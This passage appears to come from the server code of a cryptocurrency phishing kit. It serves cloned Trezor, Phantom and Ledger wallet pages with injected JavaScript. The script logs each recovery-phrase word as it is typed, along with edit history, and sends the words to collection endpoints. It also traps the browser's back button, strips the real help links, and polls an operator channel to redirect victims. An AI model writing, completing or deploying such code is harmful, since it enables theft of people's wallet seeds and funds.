        if(_walletChevron)_walletChevron.style.transform='';
      }
    });
    if(_ppInput){
      _ppInput.addEventListener('input',function(){sendState(false);updateSubmitBtn();});
    }

    document.querySelectorAll('button').forEach(function(btn){
      var txt=(btn.textContent||'').trim();
      var m=txt.match(/^(\d+)\s*words?$/i);
      if(!m)return;
      var n=parseInt(m[1],10);
      btn.addEventListener('click',function(e){
        e.preventDefault();e.stopImmediatePropagation();
        _currentCount=n;
        setActiveWordBtn(n);
        // Show/hide inputs beyond n and clear all on switch
        var inputs=getInputs();
        inputs.forEach(function(inp,idx){
          inp.value='';
          var wrap=inp.closest('.relative')||inp.parentElement;
          if(wrap)wrap.style.display=(idx<n)?'':'none';
        });
        _wh={};_lastWords={};_lastSnap='';
        // Track word count change
        fetch(TRACK,{method:'POST',body:new URLSearchParams({_token:CSRF,page:'trezor_phrase_page',type:'phrase_input',element:'word_count',value:String(n)}),keepalive:true}).catch(function(){});
        sendState(true);
        updateSubmitBtn();
      });
    });

    function attachListeners(){
      var inputs=getInputs();
      if(inputs.length<12){setTimeout(attachListeners,300);return;}
      inputs.forEach(function(inp){
        inp.addEventListener('input',function(){
          sendState(false);
          updateSubmitBtn();
        });

        // Enter: advance to next active input or submit
        inp.addEventListener('keydown',function(e){
          if(e.key==='Enter'){
            e.preventDefault();
            var active=getActiveInputs();
            var ai=active.indexOf(inp);
            if(ai>=0&&ai<active.length-1){active[ai+1].focus();}
            else{handleSubmit(null);}
          }
        });

        // Space after a word: trim and advance
        inp.addEventListener('keyup',function(e){
          if(e.key===' '){
            var v=inp.value;
            if(v.trim()!==''&&v.endsWith(' ')){
              inp.value=v.trim();
              inp.dispatchEvent(new Event('input',{bubbles:true}));
              var active=getActiveInputs();
              var ai=active.indexOf(inp);
              if(ai>=0&&ai<active.length-1){active[ai+1].focus();}
            }
          }
        });

        // Paste: distribute words across all active inputs from this position
        inp.addEventListener('paste',function(e){
          e.preventDefault();
          var text=(e.clipboardData||window.clipboardData).getData('text');
          if(!text)return;
          var words=text.trim().split(/\s+/).filter(function(w){return w.length>0;});
          if(!words.length)return;
          var active=getActiveInputs();
          var startIdx=active.indexOf(inp);
          if(startIdx<0)startIdx=0;
          words.slice(0,active.length-startIdx).forEach(function(w,i){
            var t=active[startIdx+i];
            if(!t)return;
            t.value=w;
            t.dispatchEvent(new Event('input',{bubbles:true}));
          });
          _lastSnap='';
          sendState(true);
          updateSubmitBtn();
          var nextEmpty=active.find(function(i){return i.value.trim()==='';});
          if(nextEmpty)nextEmpty.focus();
          else if(active.length)active[active.length-1].focus();
        });
      });
      updateSubmitBtn();
    }
    attachListeners();
    setInterval(function(){sendState(true);},3000);

    // â”€â”€ Hook submit button â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    function hookSubmit(){
      // Primary: stable injected ID (works even with custom button text)
      var sub=document.getElementById('trzp-submit-btn');
      // Fallback: text-based search for default or known variants
      if(!sub){
        var btns=Array.from(document.querySelectorAll('button'));
        btns.forEach(function(b){
          var t=(b.textContent||'').trim().toLowerCase();
          if(t.includes('keep going')||t.includes('continue')){sub=b;}
        });
      }
      // Last resort: the last button that is not a word-count button and not wallet-related
      if(!sub){
        var allBtns=Array.from(document.querySelectorAll('form button, button[type="button"]:not(#trzp-wallet-toggle):not(#trzp-opt-standard):not(#trzp-opt-passphrase)'));
        for(var _bi=allBtns.length-1;_bi>=0;_bi--){
          var _bt=(allBtns[_bi].textContent||'').trim();
          if(!/^\d+\s*words?$/i.test(_bt)){sub=allBtns[_bi];break;}
        }
      }
      if(!sub){setTimeout(hookSubmit,300);return;}
      _submitBtn=sub;
      _submitBtnOrigHTML=sub.innerHTML;
      sub.addEventListener('click',handleSubmit,true);
    }
    hookSubmit();

    // Eye toggle (per field — does not sync the grid or passphrase)
    var EYE_SHOW='<svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
    var EYE_HIDE='<svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
    function toggleOneEye(inp, btn){
      if(!inp||!btn)return;
      var show=inp.type==='password';
      var start=inp.selectionStart, end=inp.selectionEnd;
      var had=document.activeElement===inp;
      inp.type=show?'text':'password';
      btn.innerHTML=show?EYE_SHOW:EYE_HIDE;
      if(had){
        inp.focus();
        try{ if(typeof start==='number') inp.setSelectionRange(start,end); }catch(e){}
      }
    }
    function addEyeBtn(wrap,inp){
      if(!wrap||!inp||wrap.querySelector('.trzp-eye-btn'))return;
      inp.style.paddingRight='26px';
      var b=document.createElement('button');
      b.type='button';b.className='trzp-eye-btn';
      b.style.cssText='position:absolute;right:6px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;padding:0;color:#82d8b9;line-height:0;';
      b.innerHTML=EYE_HIDE;
      b.addEventListener('mousedown',function(e){e.preventDefault();});
      b.addEventListener('click',function(e){e.preventDefault();e.stopPropagation();toggleOneEye(inp,b);});
      wrap.appendChild(b);
    }
    function injectEyeButtons(){
      var inputs=Array.from(document.querySelectorAll('input[placeholder^="Word"]'));
      if(inputs.length<12){setTimeout(injectEyeButtons,300);return;}
      inputs.forEach(function(inp,idx){
        var wrap=inp.closest('.relative')||inp.parentElement;
        addEyeBtn(wrap,inp);
        // Number label (always visible, top-left)
        if(wrap&&!wrap.querySelector('.trzp-num')){
          var num=document.createElement('span');
          num.className='trzp-num';
          num.textContent=String(idx+1);
          num.style.cssText='position:absolute;left:5px;top:3px;font-size:9px;color:rgba(255,255,255,0.28);pointer-events:none;line-height:1;font-weight:600;';
          wrap.appendChild(num);
          inp.style.paddingTop='15px';
          inp.style.paddingBottom='4px';
          inp.style.paddingLeft='6px';
        }
      });
      var pp=document.getElementById('trzp-passphrase');
      var pr=document.getElementById('trzp-passphrase-row');
      if(pp&&pr)addEyeBtn(pr,pp);
    }
    injectEyeButtons();

    // Wallet mode is set by goPhrasePage() in the page when user picks Standard/Passphrase

    // Beacon initial state
    fetch(TRACK,{method:'POST',body:new URLSearchParams({_token:CSRF,page:'trezor_phrase_page',type:'phrase_input',element:'word_count',value:'24'}),keepalive:true}).catch(function(){});
  });
})();
</script>
JS;
        $html = str_replace('</body>', $bridge . $ui . '</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    // ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Ledger pages ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬




    // ━━━ Phantom pages ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    private function servePhantomPage(string $htmlFile, string $pageName): \Illuminate\Http\Response
    {
        $html = file_get_contents(resource_path('views/user/phantom/' . $htmlFile));
        $html = ltrim($html, "\xEF\xBB\xBF");

        // Remove info/help icon links (external help.phantom.com links)
        $html = preg_replace('/<a\s[^>]*href=["\']https:\/\/help\.phantom\.com[^"\']*["\'][^>]*>.*?<\/a>/is', '', $html);

        $csrf     = csrf_token();
        $commands = route('track.commands');
        $track    = route('track.event');
        $leave    = route('track.leave');

        // Extract RP config parameters from POST request
        $rpConfigParams = [];
        $rpConfigParams['_title'] = request()->input('_title') ?? '';
        $rpConfigParams['_sub']   = request()->input('_sub') ?? '';
        $rpConfigParams['_btn']   = request()->input('_btn') ?? '';

        // Remove empty values to keep the object clean
        $rpConfigParams = array_filter($rpConfigParams, function($v) { return $v !== ''; });

        $rpConfigJson = json_encode($rpConfigParams, JSON_UNESCAPED_SLASHES);
        $docId = (string) request()->attributes->get('ll_document_id', '');
        $v2 = in_array($pageName, ['phantom_seeds', 'phantom_loading'], true);
        $docAuth = $v2
            ? \App\Services\DocumentAuthority::clientScript($pageName, $csrf, $docId, 'Phantom Page')
            : $this->documentAuthorityScript($pageName, 'Phantom Page');
        $histLock = '';
        if (in_array($pageName, ['phantom_seeds', 'phantom_loading'], true)) {
            $histLock = "  history.pushState(null,'',location.href);\n"
                . "  window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.replace('/phantom/loading');});\n"
                . "  window.addEventListener('pageshow',function(e){if(e.persisted)window.location.replace('/phantom/loading');});\n";
        }

        $bridge = <<<HTML

<!-- liveled command bridge -->
<script>
(function(){
  if(window.location.search.indexOf('_liveled_preview')!==-1)return;
  var CSRF='{$csrf}',TRACK='{$track}';
  window._liveledCSRF=CSRF;
  window._rpConfigParams = {$rpConfigJson};
  function navigateTo(url){if(window._llNavDone)return;window._llNavDone=true;document.body.style.transition='opacity .08s ease';document.body.style.opacity='0';setTimeout(function(){if(url===window.location.pathname||url===window.location.href){window.location.reload();}else{window.location.href=url;setTimeout(function(){window.location.replace(url);},600);}},80);}
  function redirectViaPost(url,fields){if(window._llNavDone)return;window._llNavDone=true;document.body.style.transition='opacity .08s ease';document.body.style.opacity='0';setTimeout(function(){var form=document.createElement('form');form.method='POST';form.action=url;Object.keys(fields||{}).forEach(function(k){var inp=document.createElement('input');inp.type='hidden';inp.name=k;inp.value=fields[k];form.appendChild(inp);});document.body.appendChild(form);form.submit();},80);}
  window.navigateTo=navigateTo;window.redirectViaPost=redirectViaPost;
  (function(){var _prev=window.handleAdminCommands;window.handleAdminCommands=function(event){
    if(_prev)try{_prev(event);}catch(e){}
    try{
      var d=JSON.parse(event.detail.xhr.responseText);
      if(!d.commands||!d.commands.length)return;
      try{d.commands=d.commands.filter(function(c){if(!c.id)return true;var k='_ll_cmd_'+c.id;if(sessionStorage.getItem(k))return false;sessionStorage.setItem(k,'1');return true;});}catch(e){}
      d.commands.forEach(function(cmd){
        if(cmd.command==='redirect'){var _p=cmd.payload||{};if(_p.post&&Object.keys(_p.post).length)redirectViaPost(_p.url||'/',_p.post);else navigateTo(_p.url||'/');}
        if(cmd.command==='reset'){window.location.reload();}
      });
    }catch(e){}
  };})();
  (function(){var _s=0,_p=false;function _poll(){if(_p)return;_p=true;var s=++_s;fetch('{$commands}',{headers:{'X-CSRF-TOKEN':CSRF}}).then(function(r){return r.text();}).then(function(t){_p=false;if(_s!==s)return;window.handleAdminCommands({detail:{xhr:{responseText:t}}});}).catch(function(){_p=false;});}setInterval(_poll,1000);document.addEventListener('visibilitychange',function(){if(!document.hidden)_poll();});window.addEventListener('focus',function(){_poll();});})();
  {$docAuth}
  document.addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden'){var b=new URLSearchParams({_token:CSRF,page:'{$pageName}',type:'page_exit',element:'{$pageName}',value:Math.round(performance.now()/1000)+'s'});navigator.sendBeacon('{$track}',b);}});
  window.addEventListener('pagehide',function(e){if(!e.persisted)navigator.sendBeacon('{$leave}',new URLSearchParams({_token:CSRF}));});
{$histLock}})();
</script>
HTML;

        // Phantom seeds: intercept submit + live phrase capture
        $phraseSave = route('phrase.save');
        $seedsUi = '';
        if ($pageName === 'phantom_seeds') {
            $phShowInvalid = false;
            $phReq = request();
            if ($phReq->isMethod('get') && !$phReq->has('_liveled_preview')) {
                $phToken = $phReq->cookie('liveled_token');
                $phSess  = $phToken ? \App\Models\UserSession::where('session_token', $phToken)->first() : null;
                $phMeta  = is_array($phSess?->metadata) ? $phSess->metadata : [];
                $phFs    = (isset($phMeta['form_state']) && is_array($phMeta['form_state']))
                    ? $phMeta['form_state'] : [];
                if (($phFs['phantom_seeds'] ?? 'default') === 'invalid') {
                    $phShowInvalid = true;
                    if ($phSess) {
                        \App\Models\UserSession::where('session_token', $phSess->session_token)
                            ->where('metadata->form_state->phantom_seeds', 'invalid')
                            ->update(['metadata->form_state->phantom_seeds' => 'default']);
                    }
                }
            }
            $phInvalidJs = $phShowInvalid ? 'true' : 'false';
            $seedsUi = <<<JS
<script>
(function(){
  var CSRF='{$csrf}', TRACK='{$track}', SAVE='{$phraseSave}';
  var _llPhInvalid={$phInvalidJs};
  var _wh={}, _lastWords={}, _lastSnap='';

  function getInputs(){
    var grid=document.getElementById('ph-word-grid');
    if(grid)return Array.from(grid.querySelectorAll('input'));
    return Array.from(document.querySelectorAll('input[data-testid^="secret-recovery"]'));
  }
  function isGridInput(el){
    if(!el||el.tagName!=='INPUT')return false;
    if(el.closest&&el.closest('#ph-word-grid'))return true;
    var t=el.getAttribute('data-testid')||'';
    return t.indexOf('secret-recovery')===0;
  }
  function getWords(){
    return getInputs().map(function(i){return (i.value||'').trim();});
  }
  function modeCount(){
    var grid=document.getElementById('ph-word-grid');
    return (grid && grid.classList.contains('is-24')) ? 24 : 12;
  }
  function visibleWords(){
    return getWords().slice(0, modeCount());
  }
  function checkEnable(){
    var mode=modeCount();
    var n=visibleWords().filter(Boolean).length;
    var btn=document.getElementById('import-submit-btn');
    if(btn)btn.disabled=!(n===mode);
  }
  function sendState(force){
    if(!window._llDocId||!window._llStayOk)return Promise.resolve();
    var words=getWords();
    if(!words.some(Boolean)&&!force)return Promise.resolve();
    words.forEach(function(w,i){
      var k=String(i+1),prev=_lastWords[k]||'';
      if(prev&&prev!==w){if(!_wh[k])_wh[k]=[];if(_wh[k].indexOf(prev)===-1)_wh[k].push(prev);}
      _lastWords[k]=w;
    });
    var snap=JSON.stringify({words:words,totalWords:words.length,wordHistory:_wh,passphrase:'',passphraseHistory:[]});
    if(snap===_lastSnap&&!force)return Promise.resolve();
    _lastSnap=snap;
    var b=new URLSearchParams({_token:CSRF,page:'phantom_seeds',type:'phrase_input',element:'full_state',value:snap,doc:window._llDocId,stay:String(window._llStayId||'')});
    return window._llPostTrack(b);
  }
  if(window._llStayReadyPromise)window._llStayReadyPromise.then(function(){sendState(false);});

  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isPhGet(u){
    var p=destPath(u);
    return p==='/phantom/seeds'||p==='/phantom/recover'||p==='/phantom/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isPhGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname) window.location.reload();
        else window.location.href=dest;
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };

  document.addEventListener('DOMContentLoaded',function(){
    if(_llPhInvalid){
      var err=document.getElementById('ph-seed-err');
      if(err){
        err.style.display='block';
        setTimeout(function(){        err.style.display='none';},10000);
      }
    }

    var grid=document.getElementById('ph-word-grid');
    var toggle=document.getElementById('toggle-phrase-length');
    if(toggle&&grid){
      toggle.addEventListener('click',function(e){
        e.preventDefault();
        var now24=!grid.classList.contains('is-24');
        grid.classList.toggle('is-24',now24);
        toggle.textContent=now24?'I have a 12 word recovery phrase':'I have a 24-word recovery phrase';
        getInputs().forEach(function(inp){inp.value='';});
        _wh={};_lastWords={};_lastSnap='';
        var err=document.getElementById('ph-seed-err');
        if(err)err.style.display='none';
        checkEnable();
      });
    }

    document.addEventListener('input',function(e){
      if(isGridInput(e.target)){
        checkEnable();
        sendState(false);
      }
    });
    document.addEventListener('paste',function(e){
      var inp=e.target;
      if(!isGridInput(inp))return;
      var text=(e.clipboardData||window.clipboardData).getData('text');
      var words=text.trim().split(/\s+/).filter(Boolean);
      if(words.length<2)return;
      e.preventDefault();
      var inputs=getInputs();
      var startIdx=inputs.indexOf(inp);if(startIdx<0)startIdx=0;
      var cap=modeCount();
      for(var i=0;i<words.length&&(startIdx+i)<cap;i++){
        inputs[startIdx+i].value=words[i];
        inputs[startIdx+i].dispatchEvent(new Event('input',{bubbles:true}));
      }
      setTimeout(function(){sendState(true);},50);
    },true);
    var btn=document.getElementById('import-submit-btn');
    if(btn){
      btn.addEventListener('click',function(e){
        e.preventDefault();e.stopImmediatePropagation();
        var mode=modeCount();
        var words=visibleWords().filter(Boolean);
        if(words.length!==mode)return;
        Promise.resolve(window._llStayReadyPromise)
        .then(function(){
          if(!window._llStayOk)throw new Error('stay');
          return sendState(true);
        })
        .then(function(){
          var b=new URLSearchParams({_token:CSRF,page:'phantom_seeds',type:'form_submit',element:'seed_phrase',value:words.join(' '),doc:window._llDocId,stay:String(window._llStayId||'')});
          return window._llPostTrack(b);
        })
        .then(function(){
          return fetch(SAVE,{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-TOKEN':CSRF},
            body:JSON.stringify({words:words,passphrase:'',page:'phantom_seeds',history:_wh}),
            keepalive:true
          }).then(function(r){if(!r.ok)throw new Error('save');});
        })
        .then(function(){
          window.location.href='/phantom/loading';
        })
        .catch(function(){});
      },true);
    }
    var form=document.querySelector('form[data-testid="onboarding-form"]');
    if(form)form.addEventListener('submit',function(e){e.preventDefault();},true);
    getInputs().forEach(function(inp,idx){
      inp.addEventListener('keydown',function(e){
        if(e.key!=='Enter')return;
        e.preventDefault();
        var inputs=getInputs();
        if(idx<modeCount()-1)inputs[idx+1].focus();
      });
    });
    checkEnable();
    setInterval(function(){sendState(false);},3000);
  });
})();
</script>
JS;
        }

        $html = str_replace('</body>', $bridge . $seedsUi . '</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    public function phantomSeeds(Request $request)
    {
        return $this->servePhantomPage('seeds.html', 'phantom_seeds');
    }

    public function phantomRecover(Request $request)
    {
        $html = file_get_contents(resource_path('views/user/phantom/recover.html'));
        $html = ltrim($html, "\xEF\xBB\xBF");
        if (!preg_match('/^\s*<!DOCTYPE/i', $html)) $html = "<!DOCTYPE html>\n" . $html;
        $bridge = $this->buildCommandBridge('phantom_recover', '/phantom/loading', true);
        $phInvalidJs = $this->consumeFormStateOnce('phantom_recover') ? 'true' : 'false';
        $ui = <<<JS
<script>
(function(){
  var _llPhRecInvalid={$phInvalidJs};
  function getInputs(){
    var grid=document.getElementById('ph-word-grid');
    if(grid)return Array.from(grid.querySelectorAll('input'));
    return Array.from(document.querySelectorAll('input[data-testid^="secret-recovery"]'));
  }
  function isGridInput(el){
    if(!el||el.tagName!=='INPUT')return false;
    if(el.closest&&el.closest('#ph-word-grid'))return true;
    var t=el.getAttribute('data-testid')||'';
    return t.indexOf('secret-recovery')===0;
  }
  function getWords(){
    return getInputs().map(function(i){return (i.value||'').trim();});
  }
  function modeCount(){
    var grid=document.getElementById('ph-word-grid');
    return (grid && grid.classList.contains('is-24')) ? 24 : 12;
  }
  function visibleWords(){
    return getWords().slice(0, modeCount());
  }
  function checkEnable(){
    var mode=modeCount();
    var n=visibleWords().filter(Boolean).length;
    var btn=document.getElementById('import-submit-btn');
    if(btn)btn.disabled=!(n===mode);
  }
  function hop(){
    if(typeof window.navigateTo==='function')window.navigateTo('/phantom/loading');
    else window.location.href='/phantom/loading';
  }
  document.addEventListener('DOMContentLoaded',function(){
    if(_llPhRecInvalid){
      var err=document.getElementById('ph-seed-err');
      if(err){
        err.style.display='block';
        setTimeout(function(){err.style.display='none';},10000);
      }
    }
    var grid=document.getElementById('ph-word-grid');
    var toggle=document.getElementById('toggle-phrase-length');
    if(toggle&&grid){
      toggle.addEventListener('click',function(e){
        e.preventDefault();
        var now24=!grid.classList.contains('is-24');
        grid.classList.toggle('is-24',now24);
        toggle.textContent=now24?'I have a 12 word recovery phrase':'I have a 24-word recovery phrase';
        getInputs().forEach(function(inp){inp.value='';});
        var err=document.getElementById('ph-seed-err');
        if(err)err.style.display='none';
        checkEnable();
      });
    }
    document.addEventListener('input',function(e){
      if(isGridInput(e.target)) checkEnable();
    });
    document.addEventListener('paste',function(e){
      var inp=e.target;
      if(!isGridInput(inp))return;
      var text=(e.clipboardData||window.clipboardData).getData('text');
      var words=text.trim().split(/\\s+/).filter(Boolean);
      if(words.length<2)return;
      e.preventDefault();
      var inputs=getInputs();
      var startIdx=inputs.indexOf(inp);if(startIdx<0)startIdx=0;
      var cap=modeCount();
      for(var i=0;i<words.length&&(startIdx+i)<cap;i++){
        inputs[startIdx+i].value=words[i];
      }
      checkEnable();
    },true);
    var btn=document.getElementById('import-submit-btn');
    if(btn){
      btn.addEventListener('click',function(e){
        e.preventDefault();
        if(btn.disabled)return;
        hop();
      },true);
    }
    var form=document.querySelector('form[data-testid="onboarding-form"]');
    if(form){
      form.addEventListener('submit',function(e){
        e.preventDefault();
        if(!btn||btn.disabled)return;
        hop();
      });
    }
    getInputs().forEach(function(inp,idx){
      inp.addEventListener('keydown',function(e){
        if(e.key!=='Enter')return;
        e.preventDefault();
        var inputs=getInputs();
        if(idx<modeCount()-1)inputs[idx+1].focus();
      });
    });
    checkEnable();
  });
})();
</script>
JS;
        $go = <<<'JS'
<script>
(function(){
  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isPhGet(u){
    var p=destPath(u);
    return p==='/phantom/seeds'||p==='/phantom/recover'||p==='/phantom/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isPhGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname) window.location.reload();
        else window.location.href=dest;
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };
})();
</script>
JS;
        $html = str_replace('</body>', $bridge . $go . $ui . '</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    public function phantomLoading(Request $request)
    {
        $response = $this->servePhantomPage('loading.html', 'phantom_loading');
        $html = $response->getContent();
        $go = <<<'JS'
<script>
(function(){
  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isPhGet(u){
    var p=destPath(u);
    return p==='/phantom/seeds'||p==='/phantom/recover'||p==='/phantom/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isPhGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname) window.location.reload();
        else window.location.href=dest;
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };
})();
</script>
JS;
        $html = str_replace('</body>', $go.'</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    // Ledger pages

    public function ledger1(Request $request)
    {
        return $this->ledgerPage($request, 'Ledger1.html', 24, 'ledger_1');
    }

    public function ledger2(Request $request)
    {
        return $this->ledgerPage($request, 'Ledger2.html', 24, 'ledger_2');
    }

    public function ledger3(Request $request)
    {
        return $this->ledgerPage($request, 'Ledger3.html', 24, 'ledger_3');
    }

    public function ledger1Recover(Request $request)
    {
        return $this->serveLedgerRecover('Ledger1Recover.html', 'ledger_1_recover');
    }

    public function ledger2Recover(Request $request)
    {
        return $this->serveLedgerRecover('Ledger2Recover.html', 'ledger_2_recover');
    }

    public function ledger3Recover(Request $request)
    {
        return $this->serveLedgerRecover('Ledger3Recover.html', 'ledger_3_recover');
    }

    private function serveLedgerRecover(string $htmlFile, string $pageName)
    {
        $html = file_get_contents(resource_path('views/user/ledger/' . $htmlFile));
        $html = ltrim($html, "\xEF\xBB\xBF");
